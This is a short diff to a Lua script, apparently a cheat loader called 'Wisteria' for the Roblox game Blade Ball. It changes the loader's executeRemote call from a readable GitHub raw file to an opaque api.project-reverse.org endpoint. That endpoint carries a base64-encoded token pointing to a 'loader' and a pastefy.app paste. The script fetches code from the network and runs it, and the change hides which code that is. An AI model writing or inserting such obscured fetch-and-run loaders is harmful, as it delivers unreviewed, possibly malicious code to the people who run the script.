@@ -70,6 +70,6 @@ local function executeRemote(url)
     end)
 end
 
-executeRemote("https://raw.githubusercontent.com/shironaxgi/Wisteria/refs/heads/main/bladeball.lua")
+executeRemote("https://api.project-reverse.org/run/eyJpZCI6ImEyNmYwNjE0LWUwOWItNDAxYS05Yzg4LWQzZGRmYjEwMmIwYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Bhc3RlZnkuYXBwL2RLWFJldGc5L3JhdyJ9fQ")
 
 print("[Wisteria] BB loader online.")
